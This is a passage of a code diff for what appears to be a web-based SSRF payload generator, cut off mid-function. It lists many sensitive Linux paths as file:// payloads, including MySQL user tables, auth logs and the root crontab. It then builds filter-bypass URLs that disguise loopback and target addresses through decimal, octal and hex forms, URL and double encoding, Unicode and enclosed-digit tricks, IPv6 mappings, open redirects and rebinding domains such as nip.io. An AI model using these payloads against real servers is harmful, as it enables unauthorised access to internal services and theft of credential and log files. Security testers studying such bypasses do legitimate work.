+                '/usr/local/php5/httpd.conf', '/usr/local/php5/httpd.conf.php', '/usr/local/php5/lib/php.ini',
+                '/usr/local/php/httpd.conf', '/usr/local/php/httpd.conf.ini', '/usr/local/php/lib/php.ini',
+                '/usr/local/pureftpd/etc/pure-ftpd.conf', '/usr/local/pureftpd/etc/pureftpd.pdn',
+                '/usr/local/pureftpd/sbin/pure-config.pl', '/usr/local/www/logs/httpd_log',
+                '/usr/local/Zend/etc/php.ini', '/usr/sbin/pure-config.pl', '/var/adm/log/xferlog',
+                '/var/apache2/config.inc', '/var/apache/logs/access_log', '/var/apache/logs/error_log',
+                '/var/cpanel/cpanel.config', '/var/lib/mysql/my.cnf', '/var/lib/mysql/mysql/user.MYD',
+                '/var/local/www/conf/php.ini', '/var/log/apache2/access_log', '/var/log/apache2/access.log',
+                '/var/log/apache2/error_log', '/var/log/apache2/error.log', '/var/log/apache/access_log',
+                '/var/log/apache/access.log', '/var/log/apache/error_log', '/var/log/apache/error.log',
+                '/var/log/apache-ssl/access.log', '/var/log/apache-ssl/error.log', '/var/log/auth.log',
+                '/var/log/boot', '/var/htmp', '/var/log/chhttp.log', '/var/log/cups/error.log',
+                '/var/log/daemon.log', '/var/log/debug', '/var/log/dmesg', '/var/log/dpkg.log',
+                '/var/log/exim_mainlog', '/var/log/exim/mainlog', '/var/log/exim_paniclog',
+                '/var/log/exim.paniclog', '/var/log/exim_rejectlog', '/var/log/exim/rejectlog',
+                '/var/log/faillog', '/var/log/ftplog', '/var/log/ftp-proxy', '/var/log/ftp-proxy/ftp-proxy.log',
+                '/var/log/httpd/access_log', '/var/log/httpd/access.log', '/var/log/httpd/error_log',
+                '/var/log/httpd/error.log', '/var/log/httpsd/ssl.access_log', '/var/log/httpsd/ssl_log',
+                '/var/log/kern.log', '/var/log/lastlog', '/var/log/lighttpd/access.log',
+                '/var/log/lighttpd/error.log', '/var/log/lighttpd/lighttpd.access.log',
+                '/var/log/lighttpd/lighttpd.error.log', '/var/log/mail.info', '/var/log/mail.log',
+                '/var/log/maillog', '/var/log/mail.warn', '/var/log/message', '/var/log/messages',
+                '/var/log/mysqlderror.log', '/var/log/mysql.log', '/var/log/mysql/mysql-bin.log',
+                '/var/log/mysql/mysql.log', '/var/log/mysql/mysql-slow.log', '/var/log/proftpd',
+                '/var/log/pureftpd.log', '/var/log/pure-ftpd/pure-ftpd.log', '/var/log/secure',
+                '/var/log/vsftpd.log', '/var/log/wtmp', '/var/log/xferlog', '/var/log/yum.log',
+                '/var/mysql.log', '/var/run/utmp', '/var/spool/cron/crontabs/root',
+                '/var/webmin/miniserv.log', '/var/www/log/access_log', '/var/www/log/error_log',
+                '/var/www/logs/access_log', '/var/www/logs/error_log', '/var/www/logs/access.log'
+            ];
+
+            // Remove duplicates
+            const uniqueFiles = [...new Set(extendedFiles)];
+
+            // Create collapsible container
+            const collapsibleWrapper = document.createElement('div');
+            collapsibleWrapper.className = 'hint-section';
+            collapsibleWrapper.style.marginTop = '20px';
+
+            // Toggle button
+            const toggleBtn = document.createElement('button');
+            toggleBtn.className = 'collapsible-toggle';
+            toggleBtn.style.cssText = `
+                width: 100%;
+                text-align: left;
+                background: transparent;
+                border: 1px solid var(--border-color);
+                color: var(--text-primary);
+                padding: 10px 15px;
+                cursor: pointer;
+                font-size: 0.9em;
+                font-weight: bold;
+                border-radius: 4px;
+                transition: all 0.2s ease;
+                display: flex;
+                align-items: center;
+                justify-content: space-between;
+            `;
+            toggleBtn.innerHTML = `
+                <span>📁 Extended Linux File Paths (${uniqueFiles.length} files)</span>
+                <span class="toggle-icon" style="transition: transform 0.3s ease;">▼</span>
+            `;
+            toggleBtn.onmouseenter = function() {
+                this.style.borderColor = 'var(--primary-color)';
+                this.style.color = 'var(--primary-color)';
+            };
+            toggleBtn.onmouseleave = function() {
+                this.style.borderColor = 'var(--border-color)';
+                this.style.color = 'var(--text-primary)';
+            };
+
+            // Content container (collapsed by default)
+            const contentContainer = document.createElement('div');
+            contentContainer.className = 'collapsible-content';
+            contentContainer.style.cssText = `
+                display: none;
+                margin-top: 10px;
+                max-height: 600px;
+                overflow-y: auto;
+            `;
+
+            // Add all file paths (without redundant title text)
+            uniqueFiles.forEach(filePath => {
+                const hintSection = document.createElement('div');
+                hintSection.className = 'hint-section';
+                hintSection.style.marginBottom = '5px';
+
+                // Only show the payload code block, no redundant title
+                createCodeBlock(hintSection, `file://${filePath}`);
+                contentContainer.appendChild(hintSection);
+            });
+
+            // Toggle functionality
+            toggleBtn.onclick = function() {
+                const isExpanded = contentContainer.style.display !== 'none';
+                contentContainer.style.display = isExpanded ? 'none' : 'block';
+                const icon = this.querySelector('.toggle-icon');
+                icon.style.transform = isExpanded ? 'rotate(0deg)' : 'rotate(180deg)';
+            };
+
+            collapsibleWrapper.appendChild(toggleBtn);
+            collapsibleWrapper.appendChild(contentContainer);
+            container.appendChild(collapsibleWrapper);
+        }
+
+        function generateIPFormatPayloads(ip, ipNum, parts, port, path) {
+            const formats = [
+                { name: 'Decimal IP', url: `http://${ipNum}:${port}${path}`, description: 'IP address converted to a single decimal number. Example: 127.0.0.1 -> 2130706433. Works for IP addresses only.' },
+                { name: 'Hex IP (0x)', url: `http://0x${(ipNum >>> 0).toString(16)}:${port}${path}`, description: 'IP address converted to hexadecimal. Example: 127.0.0.1 -> 0x7f000001. Works for IP addresses only.' },
+                { name: 'Octal IP', url: `http://${parts.map(p => '0' + parseInt(p).toString(8)).join('.')}:${port}${path}`, description: 'Each octet converted to octal with leading zeros. Example: 127.0.0.1 -> 0177.0.0.01. Works for IP addresses only.' }
+            ];
+
+            // Only add these formats if we have enough parts
+            if (parts.length >= 2) {
+                formats.push(
+                    { name: 'Mixed Octal', url: `http://${parts[0]}.${'0' + parseInt(parts[1]).toString(8)}${parts.length > 2 ? '.' + parts[2] : ''}${parts.length > 3 ? '.' + parts[3] : ''}:${port}${path}`, description: 'Mixing decimal and octal formats. Example: 127.0.0.1 -> 127.00.0.01 (second octet in octal). Works for IP addresses only.' }
+                );
+            }
+
+            // Dotted Decimal Omit - only if we have at least 3 parts
+            if (parts.length >= 3) {
+                formats.push(
+                    { name: 'Dotted Decimal Omit', url: `http://${parts.slice(0, 3).join('.')}:${port}${path}`, description: 'Omitting the last octet (defaults to 0). Example: 127.0.0.1 -> 127.0.0. Works for IP addresses only.' }
+                );
+            }
+
+            // Dotted Decimal Omit Last - only if we have at least 2 parts
+            if (parts.length >= 2) {
+                formats.push(
+                    { name: 'Dotted Decimal Omit Last', url: `http://${parts.slice(0, 2).join('.')}:${port}${path}`, description: 'Omitting the last two octets. Example: 127.0.0.1 -> 127.0. Works for IP addresses only.' }
+                );
+            }
+
+            // Hex Dotted - only if we have 4 parts
+            if (parts.length === 4) {
+                formats.push(
+                    { name: 'Hex Dotted', url: `http://0x${parseInt(parts[0]).toString(16)}.0x${parseInt(parts[1]).toString(16)}.0x${parseInt(parts[2]).toString(16)}.0x${parseInt(parts[3]).toString(16)}:${port}${path}`, description: 'Each octet in hexadecimal format. Example: 127.0.0.1 -> 0x7f.0x0.0x0.0x1. Works for IP addresses only (requires standard 4-part format).' }
+                );
+            }
+
+            // Decimal Each Octet - use actual parts length
+            formats.push(
+                { name: 'Decimal Each Octet', url: `http://${parts.map(p => parseInt(p)).join('.')}:${port}${path}`, description: 'Standard dotted decimal format. Example: 127.0.0.1 -> 127.0.0.1. Works for IP addresses only.' }
+            );
+
+            renderPayloads('ssrf-ip-formats-container', formats, port);
+        }
+
+        // Helper: Enclosed alphanumeric mapping
+        const enclosedAlphanumeric = {
+            'a': 'ⓐ', 'b': 'ⓑ', 'c': 'ⓒ', 'd': 'ⓓ', 'e': 'ⓔ', 'f': 'ⓕ', 'g': 'ⓖ', 'h': 'ⓗ',
+            'i': 'ⓘ', 'j': 'ⓙ', 'k': 'ⓚ', 'l': 'ⓛ', 'm': 'ⓜ', 'n': 'ⓝ', 'o': 'ⓞ', 'p': 'ⓟ',
+            'q': 'ⓠ', 'r': 'ⓡ', 's': 'ⓢ', 't': 'ⓣ', 'u': 'ⓤ', 'v': 'ⓥ', 'w': 'ⓦ', 'x': 'ⓧ',
+            'y': 'ⓨ', 'z': 'ⓩ',
+            'A': 'Ⓐ', 'B': 'Ⓑ', 'C': 'Ⓒ', 'D': 'Ⓓ', 'E': 'Ⓔ', 'F': 'Ⓕ', 'G': 'Ⓖ', 'H': 'Ⓗ',
+            'I': 'Ⓘ', 'J': 'Ⓙ', 'K': 'Ⓚ', 'L': 'Ⓛ', 'M': 'Ⓜ', 'N': 'Ⓝ', 'O': 'Ⓞ', 'P': 'Ⓟ',
+            'Q': 'Ⓠ', 'R': 'Ⓡ', 'S': 'Ⓢ', 'T': 'Ⓣ', 'U': 'Ⓤ', 'V': 'Ⓥ', 'W': 'Ⓦ', 'X': 'Ⓧ',
+            'Y': 'Ⓨ', 'Z': 'Ⓩ',
+            '0': '⓪', '1': '①', '2': '②', '3': '③', '4': '④', '5': '⑤', '6': '⑥', '7': '⑦',
+            '8': '⑧', '9': '⑨'
+        };
+
+        // Helper: Unicode digit mapping (Thai, Arabic-Indic, etc.)
+        const unicodeDigits = {
+            '0': ['๐', '٠', '০', '০'], // Thai, Arabic-Indic, Bengali, Assamese
+            '1': ['๑', '١', '১', '১'],
+            '2': ['๒', '٢', '২', '২'],
+            '3': ['๓', '٣', '৩', '৩'],
+            '4': ['๔', '٤', '৪', '৪'],
+            '5': ['๕', '٥', '৫', '৫'],
+            '6': ['๖', '٦', '৬', '৬'],
+            '7': ['๗', '٧', '৭', '৭'],
+            '8': ['๘', '٨', '৮', '৮'],
+            '9': ['๙', '٩', '৯', '৯']
+        };
+
+        function generateEncodingPayloads(ip, ipNum, port, path, isIP) {
+            const encodings = [];
+
+            // 1. URL Encoding: Single encode specific characters
+            // Encode dots and specific characters in IP/domain
+            function urlEncodeSpecific(str, charsToEncode) {
+                let result = '';
+                for (let i = 0; i < str.length; i++) {
+                    const char = str[i];
+                    if (charsToEncode.includes(char)) {
+                        result += '%' + char.charCodeAt(0).toString(16).padStart(2, '0');
+                    } else {
+                        result += char;
+                    }
+                }
+                return result;
+            }
+
+            // Single URL encode dots (for IP)
+            if (isIP) {
+                encodings.push({
+                    name: 'URL Encoded Dots',
+                    url: `http://${urlEncodeSpecific(ip, ['.'])}:${port}${path}`,
+                    description: 'URL encode dots (.) in IP address. Example: 127.0.0.1 -> 127%2e0%2e0%2e1. Works for IP addresses only.'
+                });
+
+                // Single URL encode specific characters (like 'a' in admin)
+                // Example: 127.0.0.1/admin -> 127.0.0.1/%61dmin
+                if (path && path.length > 0) {
+                    const pathEncoded = urlEncodeSpecific(path, ['a', 'A', 'e', 'E', 'i', 'I', 'o', 'O', 'u', 'U']);
+                    if (pathEncoded !== path) {
+                        encodings.push({
+                            name: 'URL Encoded Path Vowels',
+                            url: `http://${ip}:${port}${pathEncoded}`,
+                            description: 'URL encode vowels (a, e, i, o, u) in path. Example: /admin -> /%61dmin. Works for both IP and domain.'
+                        });
+                    }
+                }
+            }
+
+            // Double URL encode specific characters
+            function doubleUrlEncode(str, charsToEncode) {
+            let result = '';
+                for (let i = 0; i < str.length; i++) {
+                    const char = str[i];
+                    if (charsToEncode.includes(char)) {
+                        // First encode: a -> %61
+                        const firstEncoded = '%' + char.charCodeAt(0).toString(16).padStart(2, '0');
+                        // Second encode: %61 -> %2561 (encode the % and keep 61)
+                        result += '%25' + firstEncoded.substring(1);
+                    } else {
+                        result += char;
+                    }
+            }
+            return result;
+        }
+
+            if (isIP) {
+                encodings.push({
+                    name: 'Double URL Encoded Dots',
+                    url: `http://${doubleUrlEncode(ip, ['.'])}:${port}${path}`,
+                    description: 'Double URL encode dots (.) in IP address. Example: 127.0.0.1 -> 127%252e0%252e0%252e1. Works for IP addresses only.'
+                });
+            }
+
+            if (path && path.length > 0) {
+                const pathDoubleEncoded = doubleUrlEncode(path, ['a', 'A']);
+                if (pathDoubleEncoded !== path) {
+                    encodings.push({
+                        name: 'Double URL Encoded Path (a)',
+                        url: `http://${ip}:${port}${pathDoubleEncoded}`,
+                        description: 'Double URL encode letter "a" in path. Example: /admin -> /%2561dmin. Works for both IP and domain.'
+                    });
+                }
+            }
+
+            // 2. Enclosed Alphanumeric (Circle Numbers and Letters)
+            function toEnclosedAlphanumeric(str) {
+                return str.split('').map(char => {
+                    return enclosedAlphanumeric[char] || char;
+                }).join('');
+            }
+
+            if (!isIP) {
+                // For domains, convert to enclosed alphanumeric
+                const domainEncoded = toEnclosedAlphanumeric(ip);
+                if (domainEncoded !== ip) {
+                    encodings.push({
+                        name: 'Enclosed Alphanumeric Domain',
+                        url: `http://${domainEncoded}:${port}${path}`,
+                        description: 'Domain using enclosed alphanumeric characters (circled letters/numbers). Example: example.com -> ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ. Works for domain names only.'
+                    });
+                }
+            } else {
+                // For IPs, convert numbers to enclosed numbers
+                const ipEncoded = ip.split('.').map(part => {
+                    return part.split('').map(digit => enclosedAlphanumeric[digit] || digit).join('');
+                }).join('.');
+                if (ipEncoded !== ip) {
+                    encodings.push({
+                        name: 'Enclosed Alphanumeric IP',
+                        url: `http://${ipEncoded}:${port}${path}`,
+                        description: 'IP using enclosed alphanumeric numbers (circled digits). Example: 127.0.0.1 -> ①②⑦.⓪.⓪.①. Works for IP addresses only.'
+                    });
+                }
+            }
+
+            // 3. Unicode Digit Encoding (Thai, Arabic-Indic, etc.)
+            if (isIP) {
+                const parts = ip.split('.');
+                // Thai digits
+                const ipThai = parts.map(part => {
+                    return part.split('').map(digit => unicodeDigits[digit] ? unicodeDigits[digit][0] : digit).join('');
+                }).join('.');
+                if (ipThai !== ip) {
+                    encodings.push({
+                        name: 'Unicode Digits (Thai)',
+                        url: `http://${ipThai}:${port}${path}`,
+                        description: 'IP using Thai Unicode digits. Example: 127.0.0.1 -> ๑๒๗.๐.๐.๑. Bypasses regex \\d patterns in some languages (.NET, Python 3). Works for IP addresses only.'
+                    });
+                }
+
+                // Arabic-Indic digits
+                const ipArabic = parts.map(part => {
+                    return part.split('').map(digit => unicodeDigits[digit] ? unicodeDigits[digit][1] : digit).join('');
+                }).join('.');
+                if (ipArabic !== ip) {
+                    encodings.push({
+                        name: 'Unicode Digits (Arabic-Indic)',
+                        url: `http://${ipArabic}:${port}${path}`,
+                        description: 'IP using Arabic-Indic Unicode digits. Example: 127.0.0.1 -> ١٢٧.٠.٠.١. Bypasses regex \\d patterns in some languages. Works for IP addresses only.'
+                    });
+                }
+            }
+
+            // 4. Mixed encoding for IPs (keep existing logic)
+            if (isIP) {
+                const parts = ip.split('.');
+                encodings.push(
+                    { name: 'Hex Encoded IP', url: `http://${parts.map(p => '%' + parseInt(p).toString(16).padStart(2, '0')).join('')}:${port}${path}`, description: 'IP address with each octet URL-encoded as hexadecimal. Example: 127.0.0.1 -> %7f%00%00%01. Works for IP addresses only.' }
+                );
+
+                // Mixed Encoding - only if we have at least 3 parts
+                // Example: 127.0.0.1 -> 127.0.%00.1 (encode the third octet)
+                if (parts.length >= 3) {
+                    const encodedPart = '%' + parseInt(parts[parts.length - 2]).toString(16).padStart(2, '0');
+                    const unencodedParts = parts.slice(0, parts.length - 2);
+                    const lastPart = parts[parts.length - 1];
+                    // Build URL: first parts (unencoded) + encoded part + last part
+                    const mixedIP = unencodedParts.join('.') + '.' + encodedPart + '.' + lastPart;
+                    encodings.push(
+                        { name: 'Mixed Encoding', url: `http://${mixedIP}:${port}${path}`, description: 'Mixing URL-encoded and unencoded octets. Example: 127.0.0.1 -> 127.0.%00.1 (encodes the third octet).' }
+                    );
+                }
+            }
+
+            renderPayloads('ssrf-encoding-container', encodings, port);
+        }
+
+        function generateSpecialPayloads(ip, ipNum, parts, port, path, isIP) {
+            const specials = [];
+
+            // Localhost bypasses (always available, not target-specific)
+            specials.push(
+                { name: 'Localhost Bypass', url: `http://127.0.0.1:${port}${path}`, description: 'Direct localhost access (not target-specific).' },
+                { name: 'Localhost Decimal', url: `http://2130706433:${port}${path}`, description: 'Localhost (127.0.0.1) as a decimal integer (not target-specific).' },
+                { name: 'Localhost Hex', url: `http://0x7f000001:${port}${path}`, description: 'Localhost as a hexadecimal number (not target-specific).' },
+                { name: 'IPv6 Localhost', url: `http://[::1]:${port}${path}`, description: 'IPv6 loopback address (not target-specific).' },
+                { name: 'Domain Bypass (127.0.0.1)', url: `http://127.1:${port}${path}`, description: 'Shortened localhost address (127.0.0.1 -> 127.1, not target-specific).' },
+                { name: 'Domain Bypass (0)', url: `http://0.0.0.0:${port}${path}`, description: '0.0.0.0 often resolves to localhost on Linux/macOS (not target-specific).' }
+            );
+
+            // IP-specific special payloads
+            if (isIP) {
+                specials.push(
+                    { name: 'IPv6 Mapped IPv4', url: `http://[::ffff:${ip}]:${port}${path}`, description: 'IPv4 address mapped to IPv6 (IP only).' }
+                );
+
+                // Mixed Format only for standard 4-part IP addresses
+                if (parts.length === 4) {
+                    specials.push({
+                        name: 'Mixed Format',
+                        url: `http://${parts[0]}.${parseInt(parts[1])}.${'0' + parseInt(parts[2]).toString(8)}.${parts[3]}:${port}${path}`,
+                        description: 'Mixing decimal, octal, and dotted formats (IP only, requires standard 4-part format).',
+                        variations: [
+                            {
+                                name: 'Decimal + Octal + Decimal + Decimal',
+                                url: `http://${parts[0]}.${'0' + parseInt(parts[1]).toString(8)}.${parts[2]}.${parts[3]}:${port}${path}`
+                            },
+                            {
+                                name: 'Octal + Decimal + Octal + Decimal',
+                                url: `http://${'0' + parseInt(parts[0]).toString(8)}.${parts[1]}.${'0' + parseInt(parts[2]).toString(8)}.${parts[3]}:${port}${path}`
+                            },
+                            {
+                                name: 'Hex + Decimal + Decimal + Decimal',
+                                url: `http://0x${parseInt(parts[0]).toString(16)}.${parts[1]}.${parts[2]}.${parts[3]}:${port}${path}`
+                            },
+                            {
+                                name: 'Decimal + Hex + Decimal + Decimal',
+                                url: `http://${parts[0]}.0x${parseInt(parts[1]).toString(16)}.${parts[2]}.${parts[3]}:${port}${path}`
+                            },
+                            {
+                                name: 'Octal + Octal + Decimal + Decimal',
+                                url: `http://${'0' + parseInt(parts[0]).toString(8)}.${'0' + parseInt(parts[1]).toString(8)}.${parts[2]}.${parts[3]}:${port}${path}`
+                            },
+                            {
+                                name: 'Decimal + Decimal + Hex + Decimal',
+                                url: `http://${parts[0]}.${parts[1]}.0x${parseInt(parts[2]).toString(16)}.${parts[3]}:${port}${path}`
+                            },
+                            {
+                                name: 'Decimal + Octal + Hex + Decimal',
+                                url: `http://${parts[0]}.${'0' + parseInt(parts[1]).toString(8)}.0x${parseInt(parts[2]).toString(16)}.${parts[3]}:${port}${path}`
+                            },
+                            {
+                                name: 'Octal + Hex + Decimal + Decimal',
+                                url: `http://${'0' + parseInt(parts[0]).toString(8)}.0x${parseInt(parts[1]).toString(16)}.${parts[2]}.${parts[3]}:${port}${path}`
+                            },
+                            {
+                                name: 'Hex + Octal + Decimal + Decimal',
+                                url: `http://0x${parseInt(parts[0]).toString(16)}.${'0' + parseInt(parts[1]).toString(8)}.${parts[2]}.${parts[3]}:${port}${path}`
+                            },
+                            {
+                                name: 'Decimal + Decimal + Octal + Hex',
+                                url: `http://${parts[0]}.${parts[1]}.${'0' + parseInt(parts[2]).toString(8)}.0x${parseInt(parts[3]).toString(16)}:${port}${path}`
+                            },
+                            {
+                                name: 'All Mixed (Dec + Oct + Hex + Dec)',
+                                url: `http://${parts[0]}.${'0' + parseInt(parts[1]).toString(8)}.0x${parseInt(parts[2]).toString(16)}.${parts[3]}:${port}${path}`
+                            },
+                            {
+                                name: 'All Mixed (Oct + Hex + Dec + Oct)',
+                                url: `http://${'0' + parseInt(parts[0]).toString(8)}.0x${parseInt(parts[1]).toString(16)}.${parts[2]}.${'0' + parseInt(parts[3]).toString(8)}:${port}${path}`
+                            },
+                            {
+                                name: 'All Mixed (Hex + Oct + Dec + Hex)',
+                                url: `http://0x${parseInt(parts[0]).toString(16)}.${'0' + parseInt(parts[1]).toString(8)}.${parts[2]}.0x${parseInt(parts[3]).toString(16)}:${port}${path}`
+                            }
+                        ]
+                    });
+                }
+            }
+
+            // Universal bypasses (work for both IP and domain)
+            specials.push(
+                { name: 'Redirect', url: `http://example.com/redirect?url=http://${ip}:${port}${path}`, description: 'Using an open redirect to reach the target (works for both IP and domain).' },
+                { name: 'Subdomain', url: `http://${ip.replace(/\./g, '-')}.example.com:${port}${path}`, description: 'DNS rebinding or wildcard subdomain trick (works for both IP and domain).' },
+                {
+                    name: 'Domain Embedding',
+                    url: `http://example.com@${ip}:${port}${path}`,
+                    description: 'Embedding target as authentication credentials (works for both IP and domain).',
+                    variations: [
+                        { name: 'With Port', url: `http://example.com:80@${ip}:${port}${path}` },
+                        { name: 'With Random Auth', url: `http://user:pass@${ip}:${port}${path}` }
+                    ]
+                }
+            );
+
+            renderPayloads('ssrf-special-container', specials, port);
+        }
+
+        function generateObfuscationPayloads(ip, parts, port, path) {
+            // Helper to map digits to other chars
+            const mapDigits = (str, map) => {
+                return str.split('').map(char => {
+                    if (char >= '0' && char <= '9') {
+                        return map[parseInt(char)];
+                    }
+                    return char;
+                }).join('');
+            };
+
+            const enclosedAlphanumerics = ['⓪', '①', '②', '③', '④', '⑤', '⑥', '⑦', '⑧', '⑨'];
+            const fullWidthNumbers = ['０', '１', '２', '３', '４', '５', '６', '７', '８', '９'];
+
+            // Enclosed Alphanumerics
+            const enclosedIP = parts.map(part => mapDigits(part, enclosedAlphanumerics)).join('.');
+
+            // Full Width Numbers
+            const fullWidthIP = parts.map(part => mapDigits(part, fullWidthNumbers)).join('。'); // Use ideographic full stop
+
+            const obfuscations = [
+                { name: 'Enclosed Alphanumerics', url: `http://${enclosedIP}:${port}${path}`, description: 'IP digits replaced with Enclosed Alphanumerics (e.g., ①).' },
+                { name: 'Full Width Numbers', url: `http://${fullWidthIP}:${port}${path}`, description: 'IP digits replaced with Full Width numbers (e.g., １).' },
+                { name: 'Full Width Numbers (Dot)', url: `http://${parts.map(part => mapDigits(part, fullWidthNumbers)).join('.')}:${port}${path}`, description: 'Full Width numbers with standard dots.' }
+            ];
+
+            renderPayloads('ssrf-obfuscation-container', obfuscations, port);
+        }
+
+        // Generate bypass filter payloads
+        function generateBypassFiltersPayloads(ip, ipNum, parts, port, path, isIP) {
+            const bypasses = [];
+            
+            // Check if input is localhost-related (IP or domain)
+            const isLocalhostIP = isIP && parts.length > 0 && parseInt(parts[0]) === 127;
+            const isLocalhostDomain = ip.toLowerCase() === 'localhost';
+            const isZeroIP = isIP && ip === '0.0.0.0';
+            const isLocalhostRelated = isLocalhostIP || isLocalhostDomain || isZeroIP;
+
+            // 1. Default Targets (for localhost-related inputs)
+            if (isLocalhostRelated) {
+                // Using localhost hostname (always available for localhost-related inputs)
+                bypasses.push(
+                    { name: 'localhost (HTTP)', url: `http://localhost:${port}${path}`, description: 'Using localhost hostname. Works for both IP and domain input.' },
+                    { name: 'localhost (HTTPS)', url: `https://localhost:${port}${path}`, description: 'Using localhost hostname with HTTPS.' }
+                );
+
+                // Using 127.0.0.1 (for IPs in 127.x.x.x range or localhost domain)
+                if (isLocalhostIP || isLocalhostDomain) {
+                    bypasses.push(
+                        { name: '127.0.0.1 (HTTP)', url: `http://127.0.0.1:${port}${path}`, description: 'Standard loopback address. Works for IP addresses in 127.0.0.0/8 range.' },
+                        { name: '127.0.0.1 (HTTPS)', url: `https://127.0.0.1:${port}${path}`, description: 'Standard loopback address with HTTPS.' }
+                    );
+                }
+
+                // Using 0.0.0.0
+                if (isZeroIP || isLocalhostDomain) {
+                    bypasses.push(
+                        { name: '0.0.0.0 (HTTP)', url: `http://0.0.0.0:${port}${path}`, description: 'Using 0.0.0.0 (all interfaces). Works for IP address 0.0.0.0.' },
+                        { name: '0.0.0.0 (HTTPS)', url: `https://0.0.0.0:${port}${path}`, description: 'Using 0.0.0.0 with HTTPS.' }
+                    );
+                }
+            }
+
+            // 2. IPv6 Bypasses (for localhost-related inputs)
+            if (isLocalhostRelated) {
+                bypasses.push(
+                    { name: 'IPv6 [::]', url: `http://[::]:${port}${path}`, description: 'IPv6 unspecified address. Equivalent to 0.0.0.0 in IPv4. Bypasses localhost filters.' },
+                    { name: 'IPv6 [0000::1]', url: `http://[0000::1]:${port}${path}`, description: 'IPv6 loopback address. Equivalent to 127.0.0.1 in IPv4. Bypasses localhost filters.' },
+                    { name: 'IPv6 [::1]', url: `http://[::1]:${port}${path}`, description: 'IPv6 loopback address (short form). Equivalent to 127.0.0.1 in IPv4.' },
+                    { name: 'IPv6/IPv4 Embedding [::ffff:127.0.0.1]', url: `http://[::ffff:127.0.0.1]:${port}${path}`, description: 'IPv6-mapped IPv4 address. Embeds 127.0.0.1 in IPv6 format. Bypasses localhost filters.' },
+                    { name: 'IPv6/IPv4 Embedding [0:0:0:0:0:ffff:127.0.0.1]', url: `http://[0:0:0:0:0:ffff:127.0.0.1]:${port}${path}`, description: 'IPv6-mapped IPv4 address (expanded form). Embeds 127.0.0.1 in IPv6 format.' }
+                );
+            }
+
+            // 3. Domain Redirect Bypasses (for localhost-related inputs)
+            if (isLocalhostRelated) {
+                bypasses.push(
+                    { name: 'localtest.me', url: `http://localtest.me:${port}${path}`, description: 'Domain that resolves to ::1 (IPv6 localhost). Bypasses localhost filters using domain name.' },
+                    { name: 'localh.st', url: `http://localh.st:${port}${path}`, description: 'Domain that resolves to 127.0.0.1. Short domain name bypass.' },
+                    { name: '127.0.0.1.nip.io', url: `http://127.0.0.1.nip.io:${port}${path}`, description: 'NIP.IO service maps <anything>.<IP>.nip.io to <IP>. Example: 127.0.0.1.nip.io -> 127.0.0.1.' },
+                    { name: 'anything.127.0.0.1.nip.io', url: `http://anything.127.0.0.1.nip.io:${port}${path}`, description: 'NIP.IO with prefix. Maps any subdomain to the IP address. Bypasses domain filters.' }
+                );
+            }
+
+            // 4. CIDR Bypasses (127.0.0.0/8 range)
+            if (isLocalhostIP || isLocalhostDomain) {
+                bypasses.push(
+                    { name: '127.127.127.127', url: `http://127.127.127.127:${port}${path}`, description: 'Alternative loopback address in 127.0.0.0/8 range. All 127.x.x.x addresses resolve to localhost.' },
+                    { name: '127.0.1.3', url: `http://127.0.1.3:${port}${path}`, description: 'Alternative loopback address. Any address in 127.0.0.0/8 range resolves to localhost.' },
+                    { name: '127.0.0.0', url: `http://127.0.0.0:${port}${path}`, description: 'Network address in loopback range. Still resolves to localhost.' },
+                    { name: '127.1.1.1', url: `http://127.1.1.1:${port}${path}`, description: 'Alternative loopback address. Bypasses filters that only check 127.0.0.1.' }
+                );
+            }
+
+            // 5. Rare Address Bypasses (short-hand IPs)
+            if (isIP) {
+                // Generate short-hand versions
+                const shorthandVariants = [];
+                
+                // 0/ -> 0.0.0.0
+                if (ip === '0.0.0.0' || parts[0] === '0') {
+                    shorthandVariants.push(
+                        { name: '0/', url: `http://0/:${port}${path}`, description: 'Short-hand for 0.0.0.0. Omits trailing zeros.' }
+                    );
+                }
+
+                // 127.1 -> 127.0.0.1 (if input is 127.1 or similar)
+                if (parts.length === 2 && parts[0] === '127') {
+                    shorthandVariants.push(
+                        { name: '127.1', url: `http://127.1:${port}${path}`, description: 'Short-hand IP address. Missing octets default to 0. Example: 127.1 = 127.0.0.1.' }
+                    );
+                }
+
+                // 127.0.1 -> 127.0.0.1 (if input is 127.0.1 or similar)
+                if (parts.length === 3 && parts[0] === '127' && parts[1] === '0') {
+                    shorthandVariants.push(
+                        { name: '127.0.1', url: `http://127.0.1:${port}${path}`, description: 'Short-hand IP address. Missing last octet defaults to 0. Example: 127.0.1 = 127.0.0.1.' }
+                    );
+                }
+
+                // Generate short-hand for current IP if applicable
+                if (parts.length < 4) {
+                    const shorthand = parts.join('.');
+                    shorthandVariants.push(
+                        { name: `Short-hand: ${shorthand}`, url: `http://${shorthand}:${port}${path}`, description: `Short-hand IP address. Missing octets default to 0. Example: ${shorthand} = ${parts.concat(Array(4 - parts.length).fill('0')).join('.')}.` }
+                    );
+                }
+
+                bypasses.push(...shorthandVariants);
+            }
+
+            // 6. Encoded IP Address Bypasses (supplement existing encoding section)
+            if (isIP && parts.length === 4) {
+                // Decimal IP (already in IP Format Variations, but add here for completeness)
+                bypasses.push(
+                    { name: 'Decimal IP (Bypass)', url: `http://${ipNum}:${port}${path}`, description: 'IP address as single decimal number. Example: 127.0.0.1 = 2130706433. Bypasses IP format filters.' }
+                );
+
+                // Octal IP variations (supplement existing)
+                const octalVariants = [
+                    { name: 'Octal (0177)', url: `http://0177.0.0.1:${port}${path}`, description: 'Octal format with leading 0. Example: 0177.0.0.1 = 127.0.0.1. Implementation varies by language.' },
+                    { name: 'Octal (o177)', url: `http://o177.0.0.1:${port}${path}`, description: 'Octal format with "o" prefix. Example: o177.0.0.1 = 127.0.0.1. Some implementations support this.' },
+                    { name: 'Octal (0o177)', url: `http://0o177.0.0.1:${port}${path}`, description: 'Octal format with "0o" prefix (Python 3 style). Example: 0o177.0.0.1 = 127.0.0.1.' },
+                    { name: 'Octal (q177)', url: `http://q177.0.0.1:${port}${path}`, description: 'Octal format with "q" prefix. Some legacy systems support this notation.' }
+                ];
+                bypasses.push(...octalVariants);
+
+                // Hex IP (already in IP Format Variations, but add specific bypass examples)
+                const hexIP = `0x${(ipNum >>> 0).toString(16)}`;
+                bypasses.push(
+                    { name: 'Hex IP (Bypass)', url: `http://${hexIP}:${port}${path}`, description: `IP address as hexadecimal. Example: ${hexIP} = ${ip}. Bypasses IP format filters.` }
+                );
+
+                // Additional encoded examples for common localhost IPs
+                if (isLocalhostIP || isLocalhostDomain) {
+                    // Use actual IP if it's a 127.x.x.x IP, otherwise use 127.0.0.1
